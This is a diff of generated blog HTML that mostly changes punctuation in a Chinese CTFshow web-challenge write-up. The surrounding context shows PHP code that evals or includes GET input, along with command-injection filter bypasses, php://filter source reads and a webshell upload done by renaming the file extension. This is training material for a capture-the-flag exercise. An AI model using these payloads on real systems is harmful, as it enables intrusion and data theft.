class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>需要通过<strong>Get</strong>方式传一个参数c，当c中不包含字符串”flag”时执行c中的代码</p>
+<p>需要通过<strong>Get</strong>方式传一个参数c,  当c中不包含字符串”flag”时执行c中的代码</p>
 <p>因此c无法传参为<code>?c=system(&quot;cat flag.php&quot;);</code>或<code>?c=system(&quot;cp flag.php 1.txt&quot;);</code></p>
 <p>测试<code>?c=system(&quot;ls&quot;);</code>可以看到网站目录中有<strong>flag.php</strong>及<strong>index.php</strong></p>
 <p>利用<code>?</code>和<code>*</code>的特性绕过</p>
 <blockquote>
-<p><code>?</code>可缺省占位一个字符，<code>*</code>可缺省占位几个字符</p>
+<p><code>?</code>可缺省占位一个字符,  <code>*</code>可缺省占位几个字符</p>
 </blockquote>
 <p><code>?c=system(&quot;cp fla?.php 1.txt&quot;);</code></p>
 <p>或<code>?c=system(&quot;cp ?lag.php 1.txt&quot;);</code></p>
@@ -189,7 +189,7 @@
 <p>即可通过<code>/1.txt</code>打开查看flag</p>
 <h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>原理同上，但过滤了参数c中的”flag”,”system”,”php”字符，</p>
+<p>原理同上,  但过滤了参数c中的”flag”,”system”,”php”字符,  </p>
 <p>可用<code>?c=`cp fl??.??? 1.txt`;</code></p>
 <blockquote>
 <p>PHP中<code>` `</code>相当于<code>system()</code></p>
@@ -199,10 +199,10 @@
 <p>访问即可拿到flag</p>
 <h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a><em>web31</em></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>参数c过滤了”flag”,”system”,”php”等命令及关键字符，符号<code>.</code>，<code> </code>，<code>&#39;</code>也被过滤</p>
+<p>参数c过滤了”flag”,”system”,”php”等命令及关键字符,  符号<code>.</code>,  <code> </code>,  <code>&#39;</code>也被过滤</p>
 <p>使用嵌套<strong>eval</strong>函数绕过</p>
 <p>使用<code>?c=eval($_GET[a]);&amp;a=system(&quot;ls&quot;);</code>发现<strong>flag.php</strong></p>
-<p>然后使用<code>?c=eval($_GET[a]);&amp;a=system(&quot;cat flag.php&quot;);</code>发现网页空白，<code>view-source</code>后可以查看flag（我不理解</p>
+<p>然后使用<code>?c=eval($_GET[a]);&amp;a=system(&quot;cat flag.php&quot;);</code>发现网页空白,  <code>view-source</code>后可以查看flag（我不理解</p>
 <blockquote>
 <p>?c=eval($_GET[a]);&amp;a=system(“<strong>tac</strong> flag.php”);</p>
 <p>不知道为什么可以输出</p>
@@ -212,13 +212,13 @@
 </blockquote>
 <h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a><em>web32</em></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>参数c过滤了”flag”,”system”,”php”等命令及关键字符，符号<code>.</code>，<code> </code>，<code>&#39;</code>，<code>`</code>，<code>;</code>，<code>(</code>也被过滤</p>
+<p>参数c过滤了”flag”,”system”,”php”等命令及关键字符,  符号<code>.</code>,  <code> </code>,  <code>&#39;</code>,  <code>`</code>,  <code>;</code>,  <code>(</code>也被过滤</p>
 <blockquote>
-<p>涉及文件包含，本题暂略</p>
+<p>涉及文件包含,  本题暂略</p>
 </blockquote>
 <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>通<strong>GET</strong>方式获取参数”file”，</p>
+<p>通<strong>GET</strong>方式获取参数”file”,  </p>
 <p>include语句可以包含文件</p>
 <p>使用php协议</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
@@ -227,20 +227,20 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3s1N2FjM2M0MS1jYzllLTRmMDAtODc5YS0zYTg0MTU0M2YxZGN9Ijs&#x3D;</span><br></pre></td></tr></table></figure>
 
 <p>解码后即可得到flag</p>
-<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>打开环境有提示前端验证不可靠，试着提交几个webshell，确实<code>php</code>格式不行，但是<code>jpg</code>竟然也不行???</p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>打开环境有提示前端验证不可靠,  试着提交几个webshell,  确实<code>php</code>格式不行,  但是<code>jpg</code>竟然也不行???</p>
 <p><code>png</code>格式可以（瞧不起我？.jpg</p>
-<p>提交一个png的webshell，然后bp改包将扩展名改成<code>.php</code></p>
+<p>提交一个png的webshell,  然后bp改包将扩展名改成<code>.php</code></p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/26.jpg" style="zoom: 50%;">
 
-<p>好耶，接下来就是愉快的getshell过程</p>
+<p>好耶,  接下来就是愉快的getshell过程</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/27.jpg" style="zoom: 25%;">
 
 <p>从此爱上绿色（bushi</p>
-<p>打开虚拟终端，</p>
+<p>打开虚拟终端,  </p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/28.jpg" style="zoom: 50%;">
 
 <p>一套组合拳直接带走</p>
-<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>打开环境提示后端校验，</p>
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>打开环境提示后端校验,  </p>
 <p>同<strong>web151</strong>可使用bp改包绕过后端验证</p>
 <p>getshell拿flag同理</p>
 <a class="btn-beautify button--animated block right larger" href="https://sheeprooo.top/2021/08/22/CTFshow-web/" title="CTFshow-WEB篇"><i class="far fa-hand-point-right"></i><span>CTFshow-WEB篇</span></a>
@@ -1397,7 +1397,7 @@
 <p><a href="ftp://ftp.is.co.za/rfc/rfc1808.txt">ftp://ftp.is.co.za/rfc/rfc1808.txt</a>   </p>
 <p><a href="http://www.ietf.org/rfc/rfc2396.txt">http://www.ietf.org/rfc/rfc2396.txt</a>    </p>
 <p>ldap://[2001:db8::7]/c=GB?objectClass?one    </p>
-<p>mailto:<a href="mailto:&#74;&#111;&#104;&#x6e;&#46;&#x44;&#x6f;&#101;&#64;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;">&#74;&#111;&#104;&#x6e;&#46;&#x44;&#x6f;&#101;&#64;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a>    </p>
+<p>mailto:<a href="mailto:&#74;&#x6f;&#x68;&#x6e;&#x2e;&#68;&#111;&#101;&#x40;&#x65;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#x6d;">&#74;&#x6f;&#x68;&#x6e;&#x2e;&#68;&#111;&#101;&#x40;&#x65;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a>    </p>
 <p>news:comp.infosystems.<a href="http://www.servers.unix/">www.servers.unix</a>    </p>
 <p>tel:+1-816-555-1212    </p>
 <p>telnet://192.0.2.16:80/    </p>
